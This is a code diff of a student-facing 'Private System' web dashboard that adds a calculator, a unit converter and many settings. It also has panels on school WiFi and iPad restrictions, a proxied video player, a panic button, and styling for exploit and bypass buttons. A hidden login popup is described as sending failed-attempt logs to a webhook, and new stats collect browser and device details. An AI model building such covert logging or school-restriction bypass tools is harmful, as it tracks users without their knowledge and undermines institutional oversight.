+    /* ADDED BACK CALCULATOR & CONVERTER ICONS */
+    .button-grid-container button[onclick*='calculatorPanel']::before { content: '🧮'; }
+    .button-grid-container button[onclick*='converterPanel']::before { content: '🔄'; }
+
 
     /* H2 Title Icons for Info Panels */
     .info-panel h2[id='wifiPanelTitle']::before { content: '📶'; }
@@ -691,15 +929,16 @@
     .info-panel h2[id='reminderPanelTitle']::before { content: '⏰'; }
     .info-panel h2[id='statsPanelTitle']::before { content: '📈'; }
     .info-panel h2[id='mediaPanelTitle']::before { content: '📺'; }
+    .info-panel h2[id='calculatorPanelTitle']::before { content: '🧮'; }
+    .info-panel h2[id='converterPanelTitle']::before { content: '🔄'; }
     .info-panel h2[id='settingsPanelTitle']::before { content: '🛠️'; }
   </style>
 
   <script src="https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js"></script>
-
 </head>
 <body class="login-body" id="bodyElement">
 
-    <!-- Loading Screen (retained) -->
+    <!-- Loading Screen (with rotating cube animation) -->
     <div id="loadingScreen" class="loading-screen">
       <div class="loading-cube">
         <div class="cube-face front"></div><div class="cube-face back"></div>
@@ -709,7 +948,7 @@
       <span id="loadingText" class="loading-text">Initializing System...</span>
     </div>
 
-    <!-- Login System -->
+    <!-- Login System (redesigned) -->
     <div class="login-box" id="loginBox" style="display: none;">
         <h2>𝙋𝙧𝙞𝙫𝙖𝙩𝙚 𝙎𝙮𝙨𝙩𝙚𝙢</h2>
         <input type="text" id="username" placeholder="Enter Username..." autocomplete="off" />
@@ -726,10 +965,10 @@
         <div class="error-message" id="errorMsg"></div>
         <div class="attempt-counter" id="attemptsText">Attempts Left: 3</div>
         
-        <!-- Re-added popup element for webhook logging - kept hidden. -->
+        <!-- Placeholder popup element for webhook consistency (remains hidden in UI) -->
         <div class="popup" id="resetPopup" tabindex="-1" aria-hidden="true" style="display:none;">
-            <p>Too many failed attempts.</p>
-            <input type="password" id="resetField" placeholder="SENDING LOG TO SERVER PLEASE WAIT WHILE WE ACCEPT IT" autocomplete="off" />
+            <p>Too many failed attempts. (Logs being sent)</p>
+            <input type="password" id="resetField" placeholder="Enter Reset Code" autocomplete="off" />
             <button id="resetBtn">Reset Counter</button>
         </div>
     </div>
@@ -781,14 +1020,16 @@
                 <div class="update-entry">New Advanced Statistics Panel!</div>
                 <div class="update-entry">Proxied Media Player for YouTube!</div>
                 <div class="update-entry">Refreshed Login Screen with cube animations!</div>
-                <div class="update-entry">New top-right FADING Alert System!</div>
-                <div class="update-entry">All buttons now inherit unified background theme!</div>
+                <div class="update-entry">New top-right FADING Notification System!</div>
+                <div class="update-entry">All buttons inherit unified transparent background with accent borders!</div>
                 <div class="update-entry">All dashboard panels now in individual boxes!</div>
                 <div class="update-entry">New 'Activity Log' button to view full history!</div>
+                <div class="update-entry">Re-added Calculator and Unit Converter!</div>
+                <div class="update-entry">Expanded settings with many customization options!</div>
             </div>
         </div>
       
-        <!-- Button Grid Layout for Panel-Triggering Buttons -->
+        <!-- NEW: Button Grid Layout for Panel-Triggering Buttons -->
         <div class="button-grid-container" id="panelButtonGrid">
           <div class="box"><button onclick="dashboard.togglePanel('wifiPanel')">📶 School WiFi Info</button></div>
           <div class="box"><button onclick="dashboard.togglePanel('ipadPanel')">📱 School iPad Restrictions</button></div>
@@ -809,17 +1050,19 @@
           <div class="box"><button onclick="dashboard.togglePanel('musicPanel')">🎧 Music Websites</button></div>
           <div class="box"><button onclick="dashboard.togglePanel('keyboardPanel')">⌨️ Keyboard Tricks</button></div>
 
-          <!-- RE-ADDED/NEW Panels as buttons -->
+          <!-- RE-ADDED FEATURES' BUTTONS -->
           <div class="box"><button onclick="dashboard.togglePanel('reminderPanel')">⏰ Reminders</button></div>
           <div class="box"><button onclick="dashboard.togglePanel('statsPanel')">📈 Usage Statistics</button></div>
           <div class="box"><button onclick="dashboard.togglePanel('mediaPanel')">📺 Media Player</button></div>
+          <div class="box"><button onclick="dashboard.togglePanel('calculatorPanel')">🧮 Calculator</button></div>
+          <div class="box"><button onclick="dashboard.togglePanel('converterPanel')">🔄 Unit Converter</button></div>
         </div>
 
 
         <!-- Information Panels Container -->
         <div id="infoPanelsContainer" style="margin-top: 20px;">
 
-            <!-- RE-ADDED/NEW: Reminder Panel -->
+            <!-- RE-ADDED: Reminder Panel -->
             <div id="reminderPanel" class="info-panel">
                 <h2 id="reminderPanelTitle">⏰ Reminders</h2>
                 <div class="reminder-form">
@@ -834,7 +1077,7 @@
                 <button id="clearAllRemindersBtn">Clear All Reminders</button>
             </div>
             
-            <!-- RE-ADDED/NEW: Advanced Statistics Panel -->
+            <!-- RE-ADDED: Advanced Statistics Panel -->
             <div id="statsPanel" class="info-panel">
               <h2 id="statsPanelTitle">📈 Super Advanced Usage Statistics</h2>
               <div class="stats-grid">
@@ -867,17 +1110,68 @@
               </div>
             </div>
 
-            <!-- RE-ADDED/NEW: Media Player Panel with Proxy -->
+            <!-- RE-ADDED: Media Player Panel with Proxy -->
             <div id="mediaPanel" class="info-panel">
                 <h2 id="mediaPanelTitle">📺 Proxied Media Player</h2>
                 <div class="info-text">
                     <p>Enter a YouTube video ID or full URL to watch through a private proxy (e.g., invidious.io.lol):</p>
-                    <input type="text" id="youtubeIdInput" placeholder="e.g., dQw4w9WgXcQ or https://www.youtube.com/watch?v=dQw4w9WgXcQ" style="width: 100%; padding: 8px; border-radius: 8px; border: 1px solid #555; background: #2b2b2b; color: #e0e0e0; margin-top: 5px; margin-bottom: 10px;">
+                    <input type="text" id="youtubeIdInput" placeholder="e.g., dQw4w9WgXcQ or https://www.youtube.com/watch?v=dQw4w9WgXcQ" style="width: 100%; padding: 8px; border-radius: var(--button-border-radius); border: 1px solid #555; background: #2b2b2b; color: #e0e0e0; margin-top: 5px; margin-bottom: 10px;">
                     <button id="loadYoutubeBtn">Load Video</button>
-                    <div id="youtubePlayer" style="margin-top: 20px; width: 100%; aspect-ratio: 16 / 9; background: #000; display: flex; justify-content: center; align-items: center; color: #eee; font-style: italic; border-radius: 8px;">
+                    <div id="youtubePlayer" style="margin-top: 20px; width: 100%; aspect-ratio: 16 / 9; background: #000; display: flex; justify-content: center; align-items: center; color: #eee; font-style: italic; border-radius: var(--button-border-radius);">
                         Video player will load here...
                     </div>
                 </div>
+            </div>
+
+            <!-- NEWLY ADDED: Calculator Panel -->
+            <div id="calculatorPanel" class="info-panel">
+                <h2 id="calculatorPanelTitle">🧮 Calculator</h2>
+                <div class="calculator-grid" style="border-radius: var(--button-border-radius);">
+                    <div class="calculator-output" id="calculatorOutput" style="border-radius: var(--button-border-radius);">0</div>
+                    <button class="clear" data-value="clear" style="border-radius: var(--button-border-radius);">AC</button>
+                    <button class="operator" data-value="+/-" style="border-radius: var(--button-border-radius);">+/-</button>
+                    <button class="operator" data-value="%" style="border-radius: var(--button-border-radius);">%</button>
+                    <button class="operator" data-value="/" style="border-radius: var(--button-border-radius);">÷</button>
+                    <button data-value="7" style="border-radius: var(--button-border-radius);">7</button>
+                    <button data-value="8" style="border-radius: var(--button-border-radius);">8</button>
+                    <button data-value="9" style="border-radius: var(--button-border-radius);">9</button>
+                    <button class="operator" data-value="*" style="border-radius: var(--button-border-radius);">×</button>
+                    <button data-value="4" style="border-radius: var(--button-border-radius);">4</button>
+                    <button data-value="5" style="border-radius: var(--button-border-radius);">5</button>
+                    <button data-value="6" style="border-radius: var(--button-border-radius);">6</button>
+                    <button class="operator" data-value="-" style="border-radius: var(--button-border-radius);">-</button>
+                    <button data-value="1" style="border-radius: var(--button-border-radius);">1</button>
+                    <button data-value="2" style="border-radius: var(--button-border-radius);">2</button>
+                    <button data-value="3" style="border-radius: var(--button-border-radius);">3</button>
+                    <button class="operator" data-value="+" style="border-radius: var(--button-border-radius);">+</button>
+                    <button data-value="0" style="grid-column: span 2; border-radius: var(--button-border-radius);">0</button>
+                    <button data-value="." style="border-radius: var(--button-border-radius);">.</button>
+                    <button class="equals" data-value="=" style="border-radius: var(--button-border-radius);">=</button>
+                </div>
+            </div>
+
+            <!-- NEWLY ADDED: Unit Converter Panel -->
+            <div id="converterPanel" class="info-panel">
+                <h2 id="converterPanelTitle">🔄 Unit Converter</h2>
+                <div class="converter-type-selector">
+                    <label for="conversionType" style="font-size:0.95em;">Convert:</label>
+                    <select id="conversionType" style="border-radius: var(--button-border-radius); font-size:0.95em; padding:8px;">
+                        <option value="length">Length</option>
+                        <option value="weight">Weight</option>
+                        <option value="temperature">Temperature</option>
+                        <option value="volume">Volume</option>
+                    </select>
+                </div>
+                <div class="converter-input-group">
+                    <input type="number" id="convertValue" value="1" style="border-radius: var(--button-border-radius); font-size:0.95em; padding:8px;">
+                    <select id="convertFromUnit" style="border-radius: var(--button-border-radius); font-size:0.95em; padding:8px;"></select>
+                </div>
+                <div class="converter-input-group">
+                    <label for="convertToUnit" style="font-size:0.95em;">To:</label>
+                    <select id="convertToUnit" style="border-radius: var(--button-border-radius); font-size:0.95em; padding:8px;"></select>
+                </div>
+                <div class="conversion-result" style="border-radius: var(--button-border-radius); font-size:1em;">Result: <span id="conversionResult"></span></div>
+                <button id="performConversionBtn" style="width: 100%; margin-top: 15px;">Convert</button>
             </div>
 
 
@@ -1159,57 +1453,112 @@ To view all available shortcuts for the specific app you are using, press and ho
                 <h2 id="settingsPanelTitle">🛠️ Settings</h2>
                 <div class="settings-grid">
                     <div class="setting-group">
-                        <h3>General</h3>
+                        <h3>General & Performance</h3>
                         <div class="setting-item">
-                            <label for="themeSelector">Theme:</label>
+                            <label for="themeSelector">UI Theme:</label>
                             <select id="themeSelector">
-                                <option value="dark">Dark</option>
-                                <option value="light">Light</option>
+                                <option value="dark">Dark Mode</option>
+                                <option value="light">Light Mode</option>
                             </select>
                         </div>
                         <div class="setting-item">
-                            <label for="announcementScrollSpeed">Announcement Scroll Speed:</label>
-                            <input type="range" id="announcementScrollSpeed" min="5" max="30" value="20">
-                            <span id="announcementScrollSpeedValue">20s</span>
+                            <label for="uiAnimationSpeed">UI Animation Speed:</label>
+                            <input type="range" id="uiAnimationSpeed" min="0.1" max="1.0" step="0.1" value="0.3">
+                            <span id="uiAnimationSpeedValue">0.3s</span>
+                        </div>
+                        <div class="setting-item">
+                            <label for="enableFancyAnimations">Enable Fancy Animations:</label>
+                            <input type="checkbox" id="enableFancyAnimations" checked>
+                        </div>
+                        <div class="setting-item">
+                          <label for="consoleLoggingLevel">Console Log Level:</label>
+                          <select id="consoleLoggingLevel">
+                            <option value="none">None</option>
+                            <option value="error">Errors</option>
+                            <option value="warn">Warnings</option>
+                            <option value="info">Info</option>
+                            <option value="verbose">Verbose</option>
+                          </select>
+                        </div>
+                        <div class="setting-item">
+                          <label for="confirmLogout">Confirm Logout:</label>
+                          <input type="checkbox" id="confirmLogout" checked>
                         </div>
                     </div>
 
                     <div class="setting-group">
-                        <h3>Dashboard Display</h3>
+                        <h3>Dashboard Display & Layout</h3>
                         <div class="setting-item">
-                            <label for="dashboardLayout">Layout:</label>
-                            <select id="dashboardLayout">
-                                <option value="default">Default</option>
-                                <option value="compact">Compact</option>
+                            <label for="defaultPanelOnLoad">Default Panel on Login:</label>
+                            <select id="defaultPanelOnLoad">
+                                <option value="none">None (Dashboard Home)</option>
+                                <option value="wifiPanel">School WiFi Info</option>
+                                <option value="ipadPanel">School iPad Restrictions</option>
+                                <option value="handbookPanel">Student Handbooks</option>
+                                <option value="statsPanel">Usage Statistics</option>
+                                <option value="mediaPanel">Media Player</option>
+                                <option value="calculatorPanel">Calculator</option>
+                                <option value="converterPanel">Unit Converter</option>
+                                <option value="reminderPanel">Reminders</option>
                             </select>
                         </div>
                         <div class="setting-item">
-                            <label for="enableMotivationQuote">Motivation Quote:</label>
+                            <label for="enableCalendarDisplay">Show Calendar Box:</label>
+                            <input type="checkbox" id="enableCalendarDisplay" checked>
+                        </div>
+                         <div class="setting-item">
+                            <label for="enableUpdatesNotifications">Show Updates Box:</label>
+                            <input type="checkbox" id="enableUpdatesNotifications" checked>
+                        </div>
+                        <div class="setting-item">
+                            <label for="enableMotivationQuote">Show Motivational Quote:</label>
                             <input type="checkbox" id="enableMotivationQuote" checked>
                         </div>
                         <div class="setting-item">
-                            <label for="calendarDisplay">Calendar View:</label>
-                            <select id="calendarDisplay">
-                                <option value="month">Month</option>
-                                <option value="week">Week</option>
-                            </select>
+                            <label for="globalFontSizeScale">Global Font Size Scale:</label>
+                            <input type="range" id="globalFontSizeScale" min="0.8" max="1.2" step="0.05" value="1.0">
+                            <span id="globalFontSizeScaleValue">100%</span>
+                        </div>
+                         <div class="setting-item">
+                          <label for="mainFontFamily">Main Font Family:</label>
+                          <select id="mainFontFamily">
+                            <option value="'Segoe UI', sans-serif">Segoe UI (Default)</option>
+                            <option value="'Montserrat', sans-serif">Montserrat</option>
+                            <option value="'Orbitron', sans-serif">Orbitron (Techy)</option>
+                            <option value="'Courier New', monospace">Courier New (Monospace)</option>
+                          </select>
+                        </div>
+                        <div class="setting-item">
+                            <label for="buttonBorderRadius">Button/Panel Corner Radius:</label>
+                            <input type="range" id="buttonBorderRadius" min="0" max="20" value="8">
+                            <span id="buttonBorderRadiusValue">8px</span>
                         </div>
                     </div>
 
                     <div class="setting-group">
-                        <h3>Reminders & Notifications</h3>
+                        <h3>Notifications & Logging</h3>
                         <div class="setting-item">
-                            <label for="reminderSound">Reminder Sound:</label>
-                            <input type="checkbox" id="reminderSound" checked>
+                            <label for="notificationDisplayDuration">Alert Display Duration:</label>
+                            <input type="range" id="notificationDisplayDuration" min="1" max="10" value="3">
+                            <span id="notificationDisplayDurationValue">3s</span>
                         </div>
                         <div class="setting-item">
-                            <label for="desktopNotifications">Desktop Notifications:</label>
+                            <label for="desktopNotifications">Desktop Notifications (Reminders):</label>
                             <input type="checkbox" id="desktopNotifications">
                         </div>
+                        <div class="setting-item">
+                            <label for="reminderSound">Play Reminder Sound:</label>
+                            <input type="checkbox" id="reminderSound" checked>
+                        </div>
+                         <div class="setting-item">
+                            <label for="activityLogRetention">Activity Log Max Entries:</label>
+                            <input type="range" id="activityLogRetention" min="20" max="200" step="10" value="100">
+                            <span id="activityLogRetentionValue">100 entries</span>
+                        </div>
                     </div>
 
                     <div class="setting-group">
-                        <h3>Customization</h3>
+                        <h3>Customization & Styling</h3>
                         <div class="setting-item">
                             <label for="accentColorPicker">Accent Color:</label>
                             <div class="color-picker">
@@ -1218,34 +1567,43 @@ To view all available shortcuts for the specific app you are using, press and ho
                             </div>
                         </div>
                         <div class="setting-item">
-                            <label for="mainBgColorPicker">Main Background Color:</label>
+                            <label for="mainBgColorPicker">Main BG Start Color:</label>
                             <div class="color-picker">
-                                <input type="color" id="mainBgColorPicker" value="#1a1a1a">
+                                <input type="color" id="mainBgColorPicker" value="#0d0d0d">
                                 <button class="action-button small" onclick="dashboard.resetColorSetting('mainBgColorPicker')">Reset</button>
                             </div>
                         </div>
                         <div class="setting-item">
-                            <label for="headerBgColorPicker">Header Background:</label>
+                            <label for="headerBgColorPicker">Header BG Primary Color:</label>
                             <div class="color-picker">
                                 <input type="color" id="headerBgColorPicker" value="#ff914d">
                                 <button class="action-button small" onclick="dashboard.resetColorSetting('headerBgColorPicker')">Reset</button>
                             </div>
                         </div>
-                    </div>
-
-                    <div class="setting-group">
-                        <h3>Advanced</h3>
                         <div class="setting-item">
-                            <label for="enableLogging">Enable Analytics Logging:</label>
+                            <label for="buttonGlowIntensity">Button/Box Glow Intensity:</label>
+                            <input type="range" id="buttonGlowIntensity" min="0" max="0.5" step="0.05" value="0.2">
+                            <span id="buttonGlowIntensityValue">0.2</span>
+                        </div>
+                        <div class="setting-item">
+                            <label for="scrollbarStyle">Custom Scrollbar Style:</label>
+                            <input type="checkbox" id="scrollbarStyle" checked>
+                        </div>
+                    </div>
+                    
+                    <div class="setting-group">
+                        <h3>Advanced Logging & Data</h3>
+                        <div class="setting-item">
+                            <label for="enableLogging">Enable Analytics Logging (Webhooks):</label>
                             <input type="checkbox" id="enableLogging" checked>
                         </div>
                         <div class="setting-item">
-                            <label for="dataExportBtn">Export User Data:</label>
+                            <label for="dataExportBtn">Export All User Data:</label>
                             <button id="dataExportBtn">Export JSON</button>
                         </div>
                         <div class="setting-item">
-                            <label for="clearCacheBtn">Clear Cache:</label>
-                            <button id="clearCacheBtn">Clear</button>
+                            <label for="clearCacheBtn">Clear All Local Data:</label>
+                            <button id="clearCacheBtn">Clear Cache</button>
                         </div>
                     </div>
                 </div>
@@ -1268,130 +1626,183 @@ To view all available shortcuts for the specific app you are using, press and ho
             <button class="log-modal-close-btn" onclick="dashboard.hideActivityLogModal()">&times;</button>
             <h2>📜 Activity Log</h2>
             <div class="log-modal-body" id="activityLogBody">
-                <!-- Log entries will be populated here -->
+                <!-- Log entries will be populated here by JS -->
             </div>
         </div>
     </div>
 
+    <script src="https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js"></script>
     <script>
         const dashboard = {
             activePanel: null,
             activityLogHistory: JSON.parse(localStorage.getItem('activityLogHistory') || '[]'), // Persistent log
-            
-            // Track dynamic usage stats
+
             stats: {
                 clicks: parseInt(localStorage.getItem('stats_clicks') || '0'),
                 panelsOpened: parseInt(localStorage.getItem('stats_panels_opened') || '0'),
                 themeToggles: parseInt(localStorage.getItem('stats_theme_toggles') || '0'),
                 remindersSet: parseInt(localStorage.getItem('stats_reminders_set') || '0'),
-                canvasSaves: parseInt(localStorage.getItem('stats_canvas_used') || '0'), // Renamed from canvasUsed
+                canvasSaves: parseInt(localStorage.getItem('stats_canvas_used') || '0'),
                 screenshotsTaken: parseInt(localStorage.getItem('stats_screenshots') || '0'),
                 mediaLoaded: parseInt(localStorage.getItem('stats_media_loaded') || '0'),
-                sessionUptime: '00:00:00', // Reset per session, updated by timer
-                timeToLogin: parseInt(localStorage.getItem('stats_timeToLogin') || '0'), // Persist time to login
+                sessionUptime: '00:00:00',
+                timeToLogin: parseInt(localStorage.getItem('stats_timeToLogin') || '0'),
+                // New stats that don't need direct event listeners yet
+                browserName: "...", osName: "...", screenRes: "...", viewportSize: "...",
+                deviceMemory: "...", cpus: "...", onlineStatus: "...", zoomLevel: "100%",
+                localStorageItems: 0, sessionStorageItems: 0, userAgent: "...", browserLang: "...",
+                devicePixelRatio: "...", pointerType: "...", referrer: "...", historyLength: 0,
+                notificationPerm: "..."
             },
-            
-            // NEW: Function to log alerts (to both UI notification and persistent history)
-            logAlert: function(message) {
+
+            // NEW: Function to log alerts (to both fading UI notification and persistent history)
+            logAlert: function(message, isPersistent = true) {
                 const now = new Date();
-                const timestamp = now.toLocaleTimeString('en-US', { hour12: false }); // 24-hour format
-                const fullMessage = `<span class="notification-timestamp">${timestamp}</span> ${message}`;
+                const timestampFormatted = now.toLocaleTimeString('en-US', { hour12: false }); // 24-hour format
+                const fullMessageHTML = `<span class="notification-timestamp">${timestampFormatted}</span> ${message}`;
 
                 // Add to fading notification UI
                 const container = document.getElementById('notificationContainer');
                 const notification = document.createElement('div');
                 notification.classList.add('dashboard-notification');
-                notification.innerHTML = fullMessage; // Use innerHTML to parse timestamp span
+                notification.innerHTML = fullMessageHTML;
                 
-                // Add close button
                 const closeBtn = document.createElement('button');
                 closeBtn.classList.add('notification-close-btn');
                 closeBtn.innerHTML = '&times;';
-                closeBtn.onclick = () => notification.remove();
+                closeBtn.onclick = (event) => {
+                  notification.remove();
+                  event.stopPropagation();
+                };
                 notification.appendChild(closeBtn);
 
-                container.prepend(notification); // Add to the top of the notifications list
+                container.prepend(notification);
 
-                // Trigger fade-out animation after display
+                // Trigger fade-out animation after display time
+                const notificationDuration = parseInt(localStorage.getItem('notificationDisplayDuration') || '3', 10) * 1000;
                 setTimeout(() => {
                     notification.classList.add('fade-out');
                     notification.addEventListener('animationend', () => {
                         notification.remove();
                     }, { once: true });
-                }, 3000); // Fades out after 3 seconds visible
+                }, notificationDuration);
 
-
-                // Add to persistent activity log history
-                const logEntry = {
-                    timestamp: now.toISOString(), // ISO for full precision
-                    message: message // Store plain message
-                };
-                dashboard.activityLogHistory.unshift(logEntry); // Add newest first
-                // Keep log history reasonable size, e.g., last 100 entries
-                if (dashboard.activityLogHistory.length > 100) {
-                    dashboard.activityLogHistory.pop();
+                // Add to persistent activity log history (if persistent, most are by default)
+                if (isPersistent) {
+                    const logEntry = {
+                        timestamp: now.toISOString(),
+                        message: message
+                    };
+                    dashboard.activityLogHistory.unshift(logEntry);
+                    // Keep log history to configurable max entries
+                    const maxEntries = parseInt(localStorage.getItem('activityLogRetention') || '100', 10);
+                    while (dashboard.activityLogHistory.length > maxEntries) {
+                        dashboard.activityLogHistory.pop();
+                    }
+                    localStorage.setItem('activityLogHistory', JSON.stringify(dashboard.activityLogHistory));
                 }
-                localStorage.setItem('activityLogHistory', JSON.stringify(dashboard.activityLogHistory)); // Persist
-
             },
 
-            // --- FADING INFO BOX: Display function replacement for notifications ---
-            // Replaces dashboard.showNotification calls from previous iterations
-            displayActionMessage: function(message) {
-                this.logAlert(message); // Now routes through the new fading log system
-                
-                this.stats.clicks++; // General clicks increment
-                localStorage.setItem('stats_clicks', this.stats.clicks.toString()); // Persist
-                this.updateStatsDisplay(); // Update stats display with latest count
-            },
-
-            // Updates specific CSS variables for themes and custom colors
+            // Updates CSS variables for themes and custom colors dynamically
             applyCustomStyles: function() {
                 const root = document.documentElement;
+                
+                // Get general settings from localStorage or defaults
+                const uiAnimationSpeed = localStorage.getItem('uiAnimationSpeed') || '0.3';
+                const buttonBorderRadius = localStorage.getItem('buttonBorderRadius') || '8';
+                const buttonGlowIntensity = localStorage.getItem('buttonGlowIntensity') || '0.2';
+                const mainFontFamily = localStorage.getItem('mainFontFamily') || "'Segoe UI', sans-serif";
+                const globalFontSizeScale = localStorage.getItem('globalFontSizeScale') || '1.0';
+
+                root.style.setProperty('--ui-animation-speed', uiAnimationSpeed + 's');
+                root.style.setProperty('--button-border-radius', buttonBorderRadius + 'px');
+                root.style.setProperty('--button-glow-intensity', buttonGlowIntensity);
+                root.style.setProperty('--font-family', mainFontFamily);
+                root.style.setProperty('--base-font-size', `${parseFloat(globalFontSizeScale) * 16}px`); /* Scale base size */
 
                 if (document.body.classList.contains('light-theme')) {
-                    root.style.setProperty('--main-bg', '#f0f0f0');
+                    root.style.setProperty('--main-bg-start', '#f0f0f0');
+                    root.style.setProperty('--main-bg-end', '#dddddd');
                     root.style.setProperty('--main-text-color', '#333');
                     root.style.setProperty('--box-bg-dark', '#fcfcfc');
                     root.style.setProperty('--item-bg-alt-dark', '#eee');
                     root.style.setProperty('--panel-bg-dark', '#fcfcfc');
-                    root.style.setProperty('--heading-color-light', '#994d00');
+                    root.style.setProperty('--heading-color-dark', '#994d00');
                 } else {
-                    root.style.setProperty('--main-bg', '#0d0d0d');
+                    root.style.setProperty('--main-bg-start', '#0d0d0d');
+                    root.style.setProperty('--main-bg-end', '#1a1a1a');
                     root.style.setProperty('--main-text-color', '#e0e0e0');
                     root.style.setProperty('--box-bg-dark', '#2a2a2a');
                     root.style.setProperty('--item-bg-alt-dark', '#3b3b3b');
                     root.style.setProperty('--panel-bg-dark', '#2a2a2a');
                     root.style.setProperty('--heading-color-dark', '#ffbf80');
                 }
+                
+                document.body.style.background = `linear-gradient(135deg, var(--main-bg-start), var(--main-bg-end))` + ` !important`;
+                document.body.style.backgroundAttachment = `fixed` + ` !important`;
 
                 const accentColor = localStorage.getItem('accentColor') || '#ff914d';
                 root.style.setProperty('--accent-color', accentColor);
-                root.style.setProperty('--accent-color-light-hover', this.lightenColor(accentColor, 20));
-                root.style.setProperty('--accent-color-hover-shadow', this.lightenColor(accentColor, 20, true));
+                const lightHoverColor = this.lightenColor(accentColor, 10);
+                const hoverShadowColor = this.lightenColor(accentColor, 10, true);
+                root.style.setProperty('--accent-color-light-hover', lightHoverColor);
+                root.style.setProperty('--accent-color-hover-shadow', hoverShadowColor);
+                
                 const headerBgCustom = localStorage.getItem('headerBgColor') || accentColor;
                 document.getElementById('dashboardHeader').style.background = `linear-gradient(90deg, ${headerBgCustom}, ${this.lightenColor(headerBgCustom, 30)})`;
 
                 document.getElementById('loginBox').style.borderColor = accentColor;
-                document.getElementById('loginBox').style.boxShadow = `0 0 25px ${this.lightenColor(accentColor, 20, true)}`;
+                document.getElementById('loginBox').style.boxShadow = `0 0 25px ${hoverShadowColor}`;
             
-                // Apply custom styles to dynamic elements as they are theme/accent dependent
-                document.querySelectorAll('.info-panel h2').forEach(h2 => h2.style.color = accentColor);
-                document.querySelectorAll('.box h2').forEach(h2 => {
-                  if (document.body.classList.contains('light-theme')) h2.style.color = 'var(--heading-color-light)';
-                  else h2.style.color = this.lightenColor(accentColor, 15);
-                });
-                
-                // Unified button styles. Re-applying accent borders/colors dynamically.
-                document.querySelectorAll('.login-box button, .action-button, .quickbar-container button, .button-grid-container .box button, .button-grid-container .box a').forEach(btn => {
-                    if (btn.id === 'panicBtn') return; // Don't override panic button special style
+                // Unified button styles - apply accents to borders, colors, and shadows
+                document.querySelectorAll('.login-box button, .action-button, .quickbar-container button, .button-grid-container .box button, .button-grid-container .box a, .handbook-buttons a, .links-list a, .exploit-buttons a, .bypass-buttons button, .reminder-item button').forEach(btn => {
+                    if (btn.id === 'panicBtn') return; // Don't override panic button's red style
                     btn.style.borderColor = accentColor;
                     btn.style.color = accentColor;
-                    btn.style.boxShadow = `0 0 10px ${this.lightenColor(accentColor, 20, true)}`;
+                    btn.style.boxShadow = `0 0 10px rgba(255, 145, 77, ${buttonGlowIntensity})`;
+                    btn.style.borderRadius = buttonBorderRadius + 'px';
                 });
+                document.querySelectorAll('input[type="text"], input[type="password"], input[type="number"], select, textarea').forEach(input => {
+                  if(input.closest('.settings-grid') || input.closest('.reminder-form')) {
+                    input.style.borderRadius = buttonBorderRadius + 'px';
+                  }
+                });
+
+                document.querySelectorAll('.info-panel h2').forEach(h2 => h2.style.color = accentColor);
+                document.querySelectorAll('.box h2').forEach(h2 => {
+                  if (document.body.classList.contains('light-theme')) h2.style.color = 'var(--heading-color-dark)';
+                  else h2.style.color = 'var(--heading-color-dark)';
+                });
+                
+                document.querySelectorAll('.box').forEach(box => {
+                    box.style.backgroundColor = document.body.classList.contains('light-theme') ? 'var(--box-bg-dark)' : 'var(--box-bg-dark)';
+                    box.style.boxShadow = `0 0 18px rgba(255, 145, 77, ${buttonGlowIntensity})`;
+                    box.style.borderRadius = buttonBorderRadius + 'px';
+                });
+                document.querySelectorAll('.info-panel').forEach(panel => {
+                    panel.style.backgroundColor = document.body.classList.contains('light-theme') ? 'var(--panel-bg-dark)' : 'var(--panel-bg-dark)';
+                    panel.style.boxShadow = `0 0 20px rgba(255, 145, 77, ${buttonGlowIntensity})`;
+                    panel.style.borderRadius = buttonBorderRadius + 'px';
+                });
+
+                document.querySelectorAll('.dashboard-notification').forEach(notif => {
+                  notif.style.borderLeftColor = accentColor;
+                });
+
+                // Apply custom scrollbar style
+                if (localStorage.getItem('scrollbarStyle') === 'true') {
+                    document.body.classList.add('custom-scrollbar');
+                } else {
+                    document.body.classList.remove('custom-scrollbar');
+                }
+
+                // Manage animations based on setting
+                if (localStorage.getItem('enableFancyAnimations') === 'false') {
+                    document.documentElement.style.setProperty('--ui-animation-speed', '0s');
+                }
             },
 
-            // Helper to lighten/darken a hex color and optionally add transparency to it
+            // Helper to lighten a hex color and optionally add transparency (retained)
             lightenColor: function(hex, percent, addAlpha = false) {
                 let f=parseInt(hex.slice(1),16),t=percent<0?0:255,p=percent<0?percent*-1:percent,R=f>>16,G=(f>>8)&0x00ff,B=f&0x0000ff;
                 let newR = Math.round((t-R)*p/100)+R;
@@ -1407,14 +1818,13 @@ To view all available shortcuts for the specific app you are using, press and ho
                 return "#"+(0x1000000 + newR*0x10000 + newG*0x100 + newB).toString(16).slice(1);
             },
 
-            // --- Core Dashboard Initialization ---
+            // --- Core Dashboard Initialization (re-verified) ---
             init: function() {
-                // Ensure default stats are loaded or initialized before use
+                // Initialize/load stats counters. Only init default in LS if not exists.
                 Object.keys(this.stats).forEach(key => {
                     const storedValue = localStorage.getItem(`stats_${key}`);
                     if (storedValue !== null) {
-                        // Special handling for `sessionUptime` if stored as seconds to format.
-                        if (key === 'sessionUptime') {
+                        if (key === 'sessionUptime') { // Special handling for uptime to parse from seconds
                             let totalSeconds = parseInt(localStorage.getItem('stats_sessionUptimeSeconds') || '0');
                             const hrs = String(Math.floor(totalSeconds / 3600)).padStart(2, '0');
                             const mins = String(Math.floor((totalSeconds % 3600) / 60)).padStart(2, '0');
@@ -1423,33 +1833,47 @@ To view all available shortcuts for the specific app you are using, press and ho
                         } else {
                             this.stats[key] = (key === 'timeToLogin') ? parseInt(storedValue) : parseInt(storedValue);
                         }
+                    } else if (!key.includes("Name") && key !== "sessionUptime" && key !== "onlineStatus" && key !== "zoomLevel") { // Don't set initial text for dynamic display fields as 0
+                        localStorage.setItem(`stats_${key}`, '0');
                     }
                 });
 
+                this.initSettings(); // NEW: Must be called early to apply root CSS variables from localStorage
                 this.initSessionTimer();
                 this.initClock();
                 this.generateCalendar();
-                this.initThemeToggle();
+                this.initThemeToggle(); // Uses settings
                 this.initButtons();
                 this.initCanvas();
                 this.initPanels(); // Initialize ALL panels hidden first
-                this.initReminders(); // Re-add Reminders
+                this.initReminders(); // Re-add Reminders functionality
                 this.initSuperAdvancedStatsDisplay(); // Populate advanced stats fields
-                this.initMediaPlayer(); // Re-add Media Player
-                this.initSettings(); // Now primarily handles persistent settings that weren't moved to initThemeToggle
-
+                this.initMediaPlayer(); // Re-add Media Player functionality
+                // NEW: Add back Calculator & Unit Converter
+                this.initCalculator();
+                this.initUnitConverter();
+                
                 this.colorizeWifiLevels(); // Color code the wifi panel
 
